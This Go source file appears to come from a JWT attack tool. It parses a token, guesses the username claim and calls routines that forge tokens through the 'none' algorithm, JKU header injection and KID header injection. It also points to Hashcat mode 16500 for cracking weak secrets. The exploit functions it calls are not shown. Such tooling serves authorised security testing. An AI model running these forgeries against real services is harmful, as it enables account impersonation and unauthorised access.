package attacks

import (
	"JWTechniques/ctrl"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func MainMagic(jwtStr string, userHeader string, userValue string) {

	token := ctrl.StringToToken(jwtStr)

	if token == nil {
		fmt.Print("Error : Unable to parse the JWT\n")
		return
	}

	if userHeader == "" {
		if claims, ok := token.Claims.(jwt.MapClaims); ok {

			if _, ok := claims["user"]; ok {
				userHeader = "user"
			} else if _, ok := claims["username"]; ok {
				userHeader = "username"
			} else {
				fmt.Print("The name of the \"user\" header is unknown\nThe tool will only generate tokens without modifying the \"user\" header\n\n")
				fmt.Print("------------------------------------------------------\n\n")
			}
		}
	}

	//It should always contains the "alg" header, but we check nevertheless
	if _, ok := token.Header["alg"]; ok {
		fmt.Print("Checking if the token is vulnerable to the \"none\" algorithm vuln\n\n")
		newJWTStr := ExploitNoneAlgo(token, userHeader, userValue)
		if newJWTStr != "" {
			fmt.Printf("None algorithm : %s\n\n", newJWTStr)
		}
		fmt.Print("------------------------------------------------------\n\n")
		fmt.Print("You can use Hashcat with the mode 16500 to verify if the JWT is signed with a weak secret\n\n")
		fmt.Print("------------------------------------------------------\n\n")
	}

	if _, ok := token.Header["jku"]; ok {
		fmt.Print("Your token contains the \"JKU\" header, it can maybe be exploitable through header injection\n\n")
		newJWTStr := ExploitJKU(token, userHeader, userValue)
		if newJWTStr != "" {
			fmt.Printf("JKU header injection  : %s\n\n", newJWTStr)
		}
		fmt.Print("------------------------------------------------------\n\n")
	}

	if _, ok := token.Header["kid"]; ok {
		fmt.Print("Your token contains the \"KID\" header, it can maybe be exploitable through header injection\n\n")
		newJWTStr := ExploitKID(token)
		if newJWTStr != "" {
			fmt.Printf("KID header injection : %s\n", newJWTStr)
		}
		fmt.Print("------------------------------------------------------\n\n")
	}

}
